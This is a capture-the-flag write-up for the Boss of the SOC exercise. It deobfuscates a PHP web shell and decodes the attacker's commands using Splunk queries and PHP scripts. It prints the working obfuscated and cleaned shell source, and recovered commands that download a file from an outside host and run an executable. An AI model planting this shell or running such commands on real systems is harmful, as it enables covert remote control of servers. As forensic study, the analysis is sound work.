# Boss of the SOC writeup

## PHP Web Shell

During the challenge I thought to myself that it would be a nice challenge to analyze the web shell used in the attack.

I had the source code of it so.. why not? ;)

After figuring out what file were uploaded to the server, we could extract the source code of the web shell (agent.php):

```php
    <?php
    $d='$kh="5|3481"5|;$kf=5|"9d75|5|5|b";function x($5|t,$k){$c=st5|rlen($k);$5|5|l=str5|len($t);';
    $w='"5|HTT5|5|P_ACCEPT_LANGUA5|GE"];i5|5|f($rr&&$ra)5|{    $u5|=pa5|rse_u5|rl($rr)5|;    pars';
    $u=str_replace('X','','crXeatXXe_XfuXnXction');
    $B='os5|($s[$5|i],$f);if($5|e)5|{$k=$kh5|.$kf;ob_s5|t5|art();@5|e5|val5|(@gzunco5|mpress(@x(@base';
    $c='code(x(gzco5|mpress5|($o5|),$k5|));p5|rint(5|"5|<$k>$d</$k>");@5|s5|ession_destro5|y();}}}}';
    $T='i]="";$p5|=$ss($5|p,5|3);}if(a5|rray5|5|_k5|ey_exists($i,$s)5|){$s[$i].=5|$p;$e=5|str5|p';
    $Q='ss(m5|d5($5|i.$kh),0,5|5|3))5|;$f=$s5|l($5|5|ss(5|md5($i.$kf),0,3));$p="5|";fo5|r($z=1;$';
    $a='e_s5|tr($u5|["query5|"],5|$q);$q=arr5|a5|y_5|5|values($q)5|;pr5|e5|g_match_5|all("/([\\w])5|';
    $j='[\\w-]+(?:;q=0.([\\5|d]5|)5|)?,?/",$ra,$5|m);if($q5|&&$m){5|@sessi5|on_5|start();$s5|=&$5|5';
    $N='i],05|,5|$e))),$k)));5|$o=ob_ge5|5|t_content5|s(5|);ob_e5|nd_clean();$d=5|b5|ase64_5|en';
    $Y='|5|_SESSIO5|N;$ss="s5|ub5|str";$5|sl=5|"strtolower";$5|i5|=$5|m[1][0].5|$m[1][1];$h=$sl($';
    $t='65|45|_deco5|de(p5|reg_replace(ar5|ray("/5|_5|/","/-/"),arr5|ay("/5|5|","+"),$5|ss($s5|[$';
    $o='z<cou5|nt($5|m[1]);$5|z++) $5|p.=$q[$5|m[5|5|25|][$5|z]];if(strpos5|5|($p,$h)===0){$s[$';
    $e='}^$k5|{$5|j};}}re5|turn 5|$o;}$r5|=$5|_SERVER;$rr5|=@$r[5|"HTTP_5|REFERER5|"]5|;$ra=@$r[';
    $q='$o=""5|;for($5|i5|=0;$i<$l;5|){for($j=5|05|;($j<$c5|&&$i<$l);5|$j++,$i5|5|++){5|$o.=$t{$i';
    $L=str_replace('5|','',$d.$q.$e.$w.$a.$j.$Y.$Q.$o.$T.$B.$t.$N.$c);
    $R=$u('',$L);$R();
    ?>
```

We can easily see that the code divided to several string which later concat into one string which then replaces `5|` with nothing. Let's do just that:

```php
    function webshell()
    {
        $kh = "3481";
        $kf = "9d7b";
        function x($t, $k)
        {
            $c = strlen($k);
            $l = strlen($t);
            $o = "";
            for ($i = 0; $i < $l;) {
                for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
                    $o .= $t{
                    $i} ^ $k{
                    $j};
                }
            }
            return $o;
        }
        $r = $_SERVER;
        $rr = @$r["HTTP_REFERER"];
        $ra = @$r["HTTP_ACCEPT_LANGUAGE"];
        if ($rr && $ra) {
            $u = parse_url($rr);
            parse_str($u["query"], $q);
            $q = array_values($q);
            preg_match_all("/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/", $ra, $m);
            if ($q && $m) {
                @session_start();
                $s = &$_SESSION;
                $ss = "substr";
                $sl = "strtolower";
                $i = $m[1][0] . $m[1][1];
                $h = $sl($ss(md5($i . $kh), 0, 3));
                $f = $sl($ss(md5($i . $kf), 0, 3));
                $p = "";
                for ($z = 1; $z < count($m[1]); $z++) $p .= $q[$m[2][$z]];
                if (strpos($p, $h) === 0) {
                    $s[$i] = "";
                    $p = $ss($p, 3);
                }
                if (array_key_exists($i, $s)) {
                    $s[$i] .= $p;
                    $e = strpos($s[$i], $f);
                    if ($e) {
                        $k = $kh . $kf;
                        ob_start();
                        @eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/", "/-/"), array("/", "+"), $ss($s[$i], 0, $e))), $k)));
                        $o = ob_get_contents();
                        ob_end_clean();
                        $d = base64_encode(x(gzcompress($o), $k));
                        print("<$k>$d</$k>");
                        @session_destroy();
                    }
                }
            }
        }
    }
```

The thing that I looked for are:

1. How the attacker sends his commands?
2. How they're executed?
3. How the attacker gets the outputs?

### How the attacker sends the commands?

At the begging we can see:

```php
    $r = $_SERVER;
    $rr = @$r["HTTP_REFERER"];
    $ra = @$r["HTTP_ACCEPT_LANGUAGE"];
    if ($rr && $ra) {
        ...
    }
```

We can conclude that the attacker sends his command via HTTP headers, specifically HTTP_REFERRER and HTTP_ACCEPT_LANGUAGE.

So I looked for a pattern related to those headers in the next few lines of code:

```php
    $u = parse_url($rr);
    parse_str($u["query"], $q);
    $q = array_values($q);
    preg_match_all("/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/", $ra, $m);
    if ($q && $m) {
        ...
    }
```

So there are 2 conditions:

1. The REFERRER url must contain query parameters
2. The ACCEPT_LANGUAGE must contain `;q=0`

Which led me to my next search:

```
    index="botsv1" sourcetype="stream:http" dest_ip="192.168.250.70" uri="/joomla/agent.php"  http_referrer="*?*" accept_language="*;q=0*"
    | sort 0 + _time
    | eval payload = http_referrer + " --> " + accept_language
    | table payload
```

Now we have a list of all commands sent.

![Commands](./commands.jpeg)

### How commands were executed?

Following the code, we can see data manipulation (which to be honest, don't tells me much...).
From my knowledge about web shells, I looked for `@eval` function, which I found here:

```php
    @eval(
        @gzuncompress(
            @x(
                @base64_decode(preg_replace(array("/_/", "/-/"), array("/", "+"), $ss($s[$i], 0, $e))),
                $k
            )
        )
    );
```

Now, all I had to do in order to figuring out what commands where executed was to print the string inside the `@eval` function without the need of understanding every line of the code :)

My modifications:

```php
    if (array_key_exists($i, $s)) {
        $s[$i] .= $p;
        $e = strpos($s[$i], $f);
        if ($e) {
            $k = $kh . $kf;
            ob_start();
            // @eval removed
            $command = @gzuncompress(
                @x(
                    @base64_decode(preg_replace(array("/_/", "/-/"), array("/", "+"), $ss($s[$i], 0, $e))),
                    $k
                )
            );
            if ($command) {
                print("command = " . $command . "\n");
            }
            $o = ob_get_contents();
            ob_end_clean();
            echo $o;
            $d = base64_encode(x(gzcompress($o), $k));
            print("<$k>$d</$k>");
            @session_destroy();
        }
    }
```

In order to run, change and debug the code I fired up PHP Docker container and used VSCode Remote - Containers extension for code editing and debugging inside the container.

Before I ran the code, I needed to replicate the behavior of the attacked server.
I had 2 options to achieve it:

1.  Send real traffic to my own server with the malicious PHP code.
2.  Using the list we got from Splunk.

I choose option 2 because it's much faster :)

I've copied the list from Splunk into txt file and read it using PHP:

```php
    function read_requests()
    {
        $requests = fopen("requests.txt", "r") or die("Unable to open file");
        $requests_data = fread($requests, filesize("requests.txt"));

        $requests_array = explode("\n", $requests_data);
        foreach ($requests_array as &$request) {
            $splitted = explode(" --> ", $request);
            $referrer = trim($splitted[0]);
            $accepted_lan = trim($splitted[1]);

            get_webshell_command($referrer, $accepted_lan);
        }

        fclose($requests);
    }
```

Which `get_webshell_command` is my modified version of `agent.php`.

### Getting commands outputs

Now that we got the commands, I wanted to see how the results got to the attacker.
At the end of the code I saw:

```php
    $d = base64_encode(x(gzcompress($o), $k));
    print("<$k>$d</$k>");
```

Which `$k`:

```php
    $kh = "3481";
    $kf = "9d7b";
    ...
    $k = $kh . $kf;
```

OK... The command output is `$o` which have 3 cycles of manipulations...
Let's make the opposite manipulation:

```php
    function decode_output($data)
    {
        if ($data != "-") {
            $k = get_string_between($data, '<', '>');
            $base64_encoded_command = get_string_between($data, '<' . $k . '>', '<' . $k . '/>');
            $base64_decoded_command = base64_decode($base64_encoded_command);
            $compressed_command = x($base64_decoded_command, $k);
            $uncompressed_command = gzuncompress($compressed_command);
            echo "output = " . $uncompressed_command . "\n";
        }
    }
```

`$o => compress => x => base64 => $e => debase64 => x => decompress => $o`

The function `x` just making XOR with `$k` so running it again we resolve the true data.

But where do we get the encoded results from? Splunk.
The data resides at `dest_content` which led me to the next query:

```
    index="botsv1" sourcetype="stream:http" dest_ip="192.168.250.70" http_referrer="*?*" accept_language="*;q=0*"
    | sort 0 + _time
    | fillnull value="-"
    | eval payload = http_referrer + " --> " + accept_language + " --> " + dest_content
    | stats list(payload) as Payloads
```

Again, copied the list to txt file and wrote PHP function to resolve the commands and outputs:

```php
    function main()
    {
        $com_out_file = fopen("req_and_out.txt", "r") or die("Unable to open file");
        $com_out_data = fread($com_out_file, filesize("req_and_out.txt"));

        $com_out_array = explode("\n", $com_out_data);
        foreach ($com_out_array as &$com_out) {
            $splitted = explode(" --> ", $com_out);

            $referrer = trim($splitted[0]);
            $accepted_lan = trim($splitted[1]);
            $output = trim($splitted[2]);

            get_webshell_command($referrer, $accepted_lan);
            decode_output($output);
        }

        fclose($com_out_file);
    }
```

And there you have it, commands sent and output received by the attacker.

Using that code I could see how the attacker moved the image and executed the malicious `3971.exe`:

```
    command = chdir('C:\inetpub\wwwroot\joomla');@system('3791.exe 2>&1');

    ============

    command = chdir('C:\inetpub\wwwroot\joomla');@file_put_contents(".",file_get_contents("http://prankglassinebracket.jumpingcrab.com:1337/poisonivy-is-coming-for-you-batman.jpeg"));

    ============

    command = chdir('C:\inetpub\wwwroot\joomla\images');@system('move ..\1.jpeg 2.jpeg 2>&1');
    output =         1 file(s) moved.

    ============

    command = chdir('C:\inetpub\wwwroot\joomla\images');@system('dir 2>&1');
    output =  Volume in drive C has no label.
    Volume Serial Number is 5890-B564

    Directory of C:\inetpub\wwwroot\joomla\images

    08/10/2016  03:20 PM    <DIR>          .
    08/10/2016  03:20 PM    <DIR>          ..
    08/10/2016  03:19 PM           553,879 2.jpeg
    08/09/2016  11:12 AM    <DIR>          banners
    08/09/2016  11:12 AM    <DIR>          headers
    08/09/2016  11:40 AM           111,985 imnotbatman.jpg
    05/09/2016  02:49 AM                31 index.html
    05/09/2016  02:49 AM             4,979 joomla_black.png
    05/09/2016  02:49 AM             2,180 powered_by.png
    08/09/2016  11:12 AM    <DIR>          sampledata
                5 File(s)        673,054 bytes
                5 Dir(s)  202,600,960,000 bytes free

    ============

    command = chdir('C:\inetpub\wwwroot\joomla\images');@system('move 2.jpeg imnotbatman.jpg 2>&1');
    output =         1 file(s) moved.

```
